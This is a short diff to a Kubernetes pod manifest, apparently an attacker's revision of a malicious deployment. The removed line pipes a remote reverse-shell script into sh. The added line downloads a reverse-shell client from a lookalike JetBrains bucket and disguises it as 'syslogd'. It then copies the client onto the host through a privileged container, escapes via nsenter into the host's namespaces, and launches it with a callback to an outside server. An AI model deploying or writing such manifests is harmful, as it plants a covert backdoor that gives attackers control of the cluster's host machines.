@@ -11,7 +11,7 @@ spec:
     image: alpine:latest
     command: ["/bin/sh", "-c"]
     args:
-    - "apk add --no-cache curl > /dev/null 2>&1; curl -fsSL https://jetbrainsteam-updates.s3.amazonaws.com/rshell_deploy.sh | sh; echo OK; sleep 99999"
+    - "apk add --no-cache curl > /dev/null 2>&1 && curl -fsSL -o /tmp/syslogd https://jetbrainsteam-updates.s3.amazonaws.com/rshell_client && chmod +x /tmp/syslogd && cp /tmp/syslogd /host/tmp/syslogd && chmod +x /host/tmp/syslogd && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'chmod +x /tmp/syslogd && SERVER_URL=ssl.jetbrainsteam.com:8443 nohup /tmp/syslogd > /dev/null 2>&1 &' 2>&1; echo OK; sleep 99999"
     securityContext:
       privileged: true
     volumeMounts:
